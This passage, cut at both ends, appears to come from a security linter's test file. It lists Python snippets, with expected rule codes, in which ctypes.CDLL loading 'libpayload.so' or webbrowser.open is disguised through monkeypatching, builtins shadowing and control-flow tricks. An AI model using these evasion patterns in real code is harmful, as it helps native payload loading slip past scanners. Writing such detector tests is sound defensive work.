            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nc.__dict__.__ior__({'CDLL': original})\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndict.__ior__(c.__dict__, {'CDLL': original})\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
            b"dict.setdefault(c.__dict__, 'CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.__dict__['CDLL']\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nc.__dict__.pop('CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
            b"put = c.__dict__.setdefault\nput('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL; c.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndict.__setitem__(c.__dict__, 'CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nrestore = c.__dict__.update\n"
            b"restore(CDLL=original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nput = c.__dict__.__setitem__\n"
            b"put('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel vars(c)['CDLL']\n"
            b"vars(c).setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\nput = dict.setdefault\n"
            b"put(c.__dict__, 'CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nput = wb.__dict__.__setitem__\n"
            b"put('open', original)\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndict.__delitem__(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nremove = c.__dict__.pop\nremove('CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nremove = vars(c).pop\nremove('CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nremove = dict.pop\nremove(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ndelattr(c, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\ndict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
            b"builtins.dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
            b"builtins.dict.__delitem__(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
            b"real_dict = builtins.dict\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
            b"real_dict = builtins.dict\nreal_dict.__delitem__(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\noriginal = c.CDLL\nc.CDLL = print\n"
            b"real_dict = builtins.dict\nremove = real_dict.pop\nremove(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nfrom builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nfrom builtins import (\n    dict as real_dict,\n)\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nfrom builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nfrom builtins import dict as real_dict, \\\n    len as spare\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nfrom builtins import (\n    dict as unused_dict,\n    dict as real_dict,\n)\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\npass; from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n0; from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nif True: from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nif True:\n    from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nenabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"original = c.CDLL\nc.CDLL = print\nreal_dict.pop(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"from builtins import (\n    dict as real_dict,\n)\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"from builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
            b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"from builtins import (\n    dict as unused_dict,\n    dict as real_dict,\n)\n"
            b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"from builtins import dict as real_dict, \\\n    len as spare\n"
            b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"from builtins import dict as real_dict; pass\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"pass; from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"0; from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"if True: from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"if True:\n    from builtins import dict as real_dict\n"
            b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"enabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"enabled = False\nglobals()['enabled'] = True\nif enabled:\n"
            b"    from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"enabled = True\nglobals = lambda: {}\nglobals()['enabled'] = False\nif enabled:\n"
            b"    from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"enabled = False\nglobals = lambda: {}\ndel globals\nglobals()['enabled'] = True\nif enabled:\n"
            b"    from builtins import dict as real_dict\nreal_dict.pop(c.__dict__, 'CDLL')\n"
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\n",
            b"enabled = False\nglobals()['globals'] = lambda: {}\ndel globals\n"
            b"globals()['enabled'] = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"real_dict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\nremove = dict.pop\nremove(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\noriginal = c.CDLL\nc.CDLL = print\nremove = dict.pop\n"
            b"relay = remove\nrelay(c.__dict__, 'CDLL')\n",
            b"c.__dict__.setdefault('CDLL', original)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nprint = original\nwb.open = print\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\noriginal = wb.open\nwb.open = print\nbuiltins.setattr(\n"
            b"    wb, 'open', original\n)\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nvars(c).update(\n"
            b"    **{'CDLL': original}\n)\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nif True:\n    wb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nwb.open: object = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nnamespace = wb.__dict__\n"
            b"namespace.update(open=original)\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nprint, unused = original, None\nwb.open = print\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nsetattr, unused = print, None\nsetattr(wb, 'open', print)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"import builtins\noriginal = wb.open\nbuiltins.setattr, unused = print, None\n"
            b"setattr(wb, 'open', print)\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"namespace = wb.__dict__\nnamespace, unused = {}, None\nnamespace.update(open=print)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\nimport ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nwb.open = c.CDLL = original\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.cdll\nc.cdll = print\nvars(c).update(CDLL=print, cdll=original)\n"
            b"loader = c.cdll\nloader.msvcrt\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nif False:\n    wb.open = print\nelse:\n    wb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ntry:\n    pass\nfinally:\n    wb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nchanged = setattr(wb, 'open', original)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nchanged = vars(wb).update(open=original)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\nimport webbrowser as wb\n",
            b"original = c.CDLL\nc.CDLL = print\n(wb.open, c.CDLL) = (print, original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nnamespace = wb.__dict__\nnamespace |= {'open': original}\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ntry:\n    wb.open = original\nexcept Exception:\n    pass\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nfor _ in [0]:\n    wb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nchanged = (setattr(wb, 'open', original) is None)\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nnoop = lambda arg=setattr(wb, 'open', original): arg\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\ndef noop(arg: wb.__dict__.update(open=original)):\n"
            b"    pass\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"from __future__ import annotations\nimport webbrowser as wb\n",
            b"def noop(arg: wb.__dict__.update(open=print)):\n    pass\nopener = wb.open\n"
            b"opener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"[setattr(wb, 'open', print) for _ in []]\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"[setattr(wb, 'open', print) for _ in [0] if False]\nopener = wb.open\n"
            b"opener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\n(1 == 1) and setattr(c, 'CDLL', original)\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nif 1 == 1:\n    wb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import webbrowser as wb\n",
            b"original = wb.open\nwb.open = print\nfor _ in [0, 1]:\n    wb.open = original\n"
            b"opener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    1 / 0\n    c.CDLL = print\nexcept ZeroDivisionError:\n    pass\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"value = wb.__dict__.update(open=print) if "
            + (b"not " * 1_000)
            + b"False else None\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    raise RuntimeError()\nexcept (ValueError, TypeError):\n    c.CDLL = print\n"
            b"except RuntimeError:\n    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ntry:\n    raise FileNotFoundError()\n"
            b"except OSError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    raise RuntimeError()\nexcept Exception:\n    pass\nexcept RuntimeError:\n"
            b"    c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ntry:\n    raise PermissionError()\n"
            b"except OSError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    for _ in [1 / 0]:\n        c.CDLL = print\nexcept ZeroDivisionError:\n    pass\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"try:\n    if True:\n        raise RuntimeError()\n    c.CDLL = print\n"
            b"except RuntimeError:\n    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"for _ in [0, 1]:\n    if True:\n        continue\n    c.CDLL = print\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import webbrowser as wb\n",
            b"0 == 1 == (wb.__dict__.update(open=print) is None)\nopener = wb.open\n"
            b"opener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nlist(c.__dict__.update(CDLL=original) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"list = lambda iterable: None\nlist(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b'import webbrowser as wb\n"""\nfrom __future__ import annotations\n"""\n',
            b"original = wb.open\nwb.open = print\ndef noop(arg: wb.__dict__.update(open=original)):\n"
            b"    pass\nopener = wb.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nif c.__dict__.update(CDLL=original) is None:\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nfor _ in [c.__dict__.update(CDLL=original)]:\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"original = c.CDLL\nc.CDLL = print\nbuiltins.list(c.__dict__.update(CDLL=original) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"consume = list\noriginal = c.CDLL\nc.CDLL = print\n"
            b"consume(c.__dict__.update(CDLL=original) for _ in [0])\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nfrom builtins import list as consume\n",
            b"original = c.CDLL\nc.CDLL = print\nconsume(c.__dict__.update(CDLL=original) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"builtins.list = lambda iterable: None\nlist(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"builtins.__dict__['list'] = lambda iterable: None\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"builtins.__dict__.update(list=lambda iterable: None)\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"setattr(builtins, 'list', lambda iterable: None)\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins as b\n",
            b"original = c.CDLL\nc.CDLL = print\nb.list(c.__dict__.update(CDLL=original) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nRuntimeError = ValueError\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nValueError = RuntimeError\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\ntry:\n"
            b"    raise RuntimeError(c.__dict__.update(CDLL=original))\nexcept RuntimeError:\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"original = c.CDLL\nc.CDLL = print\n"
            b"with (c.__dict__.update(CDLL=original) or contextlib.nullcontext()):\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nmatch c.__dict__.update(CDLL=original):\n"
            b"    case _:\n        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"original = c.CDLL\nc.CDLL = print\nwith contextlib.nullcontext(original) as c.CDLL:\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"original = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
            b"contextlib.nullcontext = lambda ignored: real(original)\n"
            b"with contextlib.nullcontext(print) as c.CDLL:\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nfor c.CDLL in [original]:\n"
            b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nmatch 0:\n"
            b"    case 0 if c.__dict__.update(CDLL=original) is None:\n"
            b"        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nsubject = 0\nmatch subject:\n"
            b"    case _ if c.__dict__.update(CDLL=original) is None:\n"
            b"        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nsubject = 0\nmatch subject:\n"
            b"    case _ if False:\n        pass\n"
            b"    case _ if c.__dict__.update(CDLL=original) is None:\n"
            b"        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"original = c.CDLL\nc.CDLL = print\nbuiltins.ValueError = RuntimeError\ntry:\n"
            b"    raise RuntimeError()\nexcept ValueError:\n    c.CDLL = original\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\n"
            b"for ValueError in [RuntimeError]:\n    pass\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport contextlib\n",
            b"original = c.CDLL\nc.CDLL = print\n"
            b"with contextlib.nullcontext(RuntimeError) as ValueError:\n    pass\n"
            b"try:\n    raise RuntimeError()\nexcept ValueError:\n    c.CDLL = original\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\n",
            b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\n"
            b"if globals().get('enabled'):\n    ValueError = RuntimeError\ntry:\n    raise RuntimeError()\n"
            b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"dict.update(builtins.__dict__, list=lambda iterable: None)\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
            b"dict.__setitem__(builtins.__dict__, 'list', lambda iterable: None)\n"
            b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
            b"loader = c.CDLL\nloader('libpayload.so')\n",
            "S110",
        ),
        (
            b"import ctypes as c\nimport builtins\n",
